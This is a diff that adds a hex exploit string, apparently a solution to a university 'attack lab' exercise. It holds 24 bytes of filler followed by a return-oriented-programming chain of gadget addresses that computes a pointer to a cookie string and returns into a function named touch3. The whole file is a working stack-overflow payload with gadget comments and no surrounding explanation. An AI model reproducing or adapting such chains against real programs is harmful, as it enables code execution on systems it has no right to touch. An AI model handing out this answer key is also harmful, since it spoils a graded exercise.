@@ -1,0 +1,14 @@
+01 02 03 04 05 06 07 08 09 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 /* filler */
+
+b9 1a 40 00 00 00 00 00 /* return  rsp -> rax */ 
+78 1a 40 00 00 00 00 00 /* return  rax -> rdi */ 
+66 1a 40 00 00 00 00 00 /* return  pop rax    */
+48 00 00 00 00 00 00 00 /* distance from cookie to rsp */
+68 1b 40 00 00 00 00 00 /* return  eax -> edx */ 
+28 1b 40 00 00 00 00 00 /* return  edx -> ecx */ 
+9f 1a 40 00 00 00 00 00 /* return  ecx -> esi */ 
+91 1a 40 00 00 00 00 00 /* return  lea (rdi,rsi,1),rax */ 
+78 1a 40 00 00 00 00 00 /* return  rax -> rdi */ 
+
+b9 19 40 00 00 00 00 00 /* return touch3 */
+31 63 30 30 39 36 65 31 /* str cookie */
